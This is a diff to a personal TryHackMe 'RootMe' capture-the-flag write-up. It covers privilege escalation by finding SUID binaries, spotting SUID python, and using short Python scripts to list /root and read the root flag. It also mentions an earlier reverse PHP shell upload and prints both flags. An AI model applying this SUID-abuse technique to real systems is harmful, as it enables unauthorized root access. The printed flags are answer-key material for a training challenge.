@@ -250,3 +250,79 @@ Great writeup: https://beginninghacking.net/2020/09/09/try-hack-me-rootme/
 7. We're given the name of the file that contains the flag "user.txt", so we simple use the find command: "find / -type f -name user.txt" and we see that the file is at /var/www/user.txt and when we cat it we find that the flag is THM{y0u_g0t_a_sh3ll}
 
 8. Now we need to escalate our privileges to root. We're asked to search for files with the suid permission set - which lets any user execute the file with the permissions of the owner of the file - and find any files that are supicious. To do this we use find again: "find / -perm /4000 2> /dev/null" (we use "2> /dev/null" to get rid of any errors, such as permission errors for files we're not able to access)
+>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+>/usr/lib/snapd/snap-confine
+>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+>/usr/lib/eject/dmcrypt-get-device
+>/usr/lib/openssh/ssh-keysign
+>/usr/lib/policykit-1/polkit-agent-helper-1
+>/usr/bin/traceroute6.iputils
+>/usr/bin/newuidmap
+>/usr/bin/newgidmap
+>/usr/bin/chsh
+>/usr/bin/python
+>/usr/bin/at
+>/usr/bin/chfn
+>/usr/bin/gpasswd
+>/usr/bin/sudo
+>/usr/bin/newgrp
+>/usr/bin/passwd
+>/usr/bin/pkexec
+>/snap/core/8268/bin/mount
+>/snap/core/8268/bin/ping
+>/snap/core/8268/bin/ping6
+>/snap/core/8268/bin/su
+>/snap/core/8268/bin/umount
+>/snap/core/8268/usr/bin/chfn
+>/snap/core/8268/usr/bin/chsh
+>/snap/core/8268/usr/bin/gpasswd
+>/snap/core/8268/usr/bin/newgrp
+>/snap/core/8268/usr/bin/passwd
+>/snap/core/8268/usr/bin/sudo
+>/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+>/snap/core/8268/usr/lib/openssh/ssh-keysign
+>/snap/core/8268/usr/lib/snapd/snap-confine
+>/snap/core/8268/usr/sbin/pppd
+>/snap/core/9665/bin/mount
+>/snap/core/9665/bin/ping
+>/snap/core/9665/bin/ping6
+>/snap/core/9665/bin/su
+>/snap/core/9665/bin/umount
+>/snap/core/9665/usr/bin/chfn
+>/snap/core/9665/usr/bin/chsh
+>/snap/core/9665/usr/bin/gpasswd
+>/snap/core/9665/usr/bin/newgrp
+>/snap/core/9665/usr/bin/passwd
+>/snap/core/9665/usr/bin/sudo
+>/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+>/snap/core/9665/usr/lib/openssh/ssh-keysign
+>/snap/core/9665/usr/lib/snapd/snap-confine
+>/snap/core/9665/usr/sbin/pppd
+>/bin/mount
+>/bin/su
+>/bin/fusermount
+>/bin/ping
+>/bin/umount
+
+9. Looking through the results, we see nothing suspicious until we see python. Python's an interpreter for the python programming language, and setting SUID on it makes no sense because there's no reason to run it as root; it'll produce the same output no matter who runs it. We check if that's the binary that the challenge is looking for, and it is. "/usr/bin/python"
+
+10. Now we need to write some python code and run it with /usr/bin/python to let us view the contents of the /root directory (it's given that the last flag is called root.txt, so we'll assume that it's located in /root)
+
+11. I tried writing the code inside the shell we got from the reverse shell, but python and vim were acting weird, so I instead wrote the code inside the attacker machine, uploaded it to the server just like we did with the reverse php file, and used "find / -type d -name ```*uploads*``` 2> /dev/null" to find where the files we uploaded were located. I needed to find the location because I couldn't just execute the python file with curl like we did with the php payload. I found that the files were in /var/www/html/uploads
+
+12. After this, I wrote a basic python script to print out the contents or /root
+>#!/usr/bin/python
+>import os
+>
+>print(os.listdir('/root'))
+
+13. I then uploaded that to the server and used "/usr/bin/python /var/www/html/uploads/<filename>", and I see that root.txt is indeed in /root
+
+14. Finally, to print out the contents of root.txt, I wrote this script
+>#!/usr/bin/python
+>import os
+>
+>file = open('/root/root.txt', 'r')
+>print(file.read())
+
+The last flag is THM{pr1v1l3g3_3sc4l4t10n}
